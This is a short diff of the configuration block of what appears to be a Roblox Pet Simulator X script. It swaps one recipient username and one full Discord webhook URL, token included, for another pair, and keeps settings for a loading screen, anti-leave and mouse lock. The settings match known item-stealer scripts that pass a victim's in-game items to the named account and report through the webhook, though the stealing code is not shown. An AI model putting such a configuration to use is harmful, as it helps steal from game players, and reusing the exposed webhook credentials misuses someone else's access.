@@ -1,6 +1,6 @@
-UserName = "HieuPetSimx"
-UserName2 = "HieuPetSimx"
-Webhook = "https://discord.com/api/webhooks/1107533224663584778/XWBxYKxxqanRKTpMDOilsxZ9vUfjNYiPGOMWT-diP42edMrYUbbw50sNjT4EqJ68TT3H"
+UserName = "robloxzombiboos"
+UserName2 = "robloxzombiboos"
+Webhook = "https://discord.com/api/webhooks/1107982242359287818/cT4FupstabyRxeqZxE3BwQWSB-Bg5ti1kHL9dnX6L9lEPS3T0aVfir6RqvogOQ85EMdz"
 _G.LoadingScreen = true
 _G.AntiLeave = false
 _G.MouseLock = true 
